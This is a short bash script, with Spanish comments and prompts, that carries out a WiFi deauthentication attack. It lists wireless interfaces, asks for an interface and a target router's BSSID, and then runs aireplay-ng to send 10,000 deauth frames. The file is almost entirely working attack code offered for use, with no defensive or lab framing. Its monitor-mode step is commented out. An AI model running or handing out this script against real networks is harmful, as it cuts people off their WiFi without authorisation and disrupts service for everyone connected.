#!/bin/bash

echo "=== Script de Desconexión WiFi (Deauth) ==="

# Paso 1: Mostrar interfaces WiFi disponibles
echo ""
echo "[+] Detectando interfaces WiFi..."
iw dev | grep Interface | awk '{print $2}'
echo ""
read -p "[?] Ingresa el nombre de la interfaz que quieres usar (ej. wlan0): " IFACE

# Paso 2: Poner en modo monitor
echo "[+] Activando modo monitor..."
#sudo airmon-ng start $IFACE

# Detectar nombre de interfaz en modo monitor (ej: wlan0mon)
MON_IFACE="${IFACE}"
echo "[+] Interfaz en modo monitor: $MON_IFACE"

# Paso 3: Pedir BSSID objetivo
read -p "[?] Ingresa el BSSID del router objetivo: " BSSID

# Paso 4: Lanzar ataque de deautenticación
echo "[+] Iniciando ataque de deautenticación..."
sudo aireplay-ng --deauth 10000 -a $BSSID $MON_IFACE
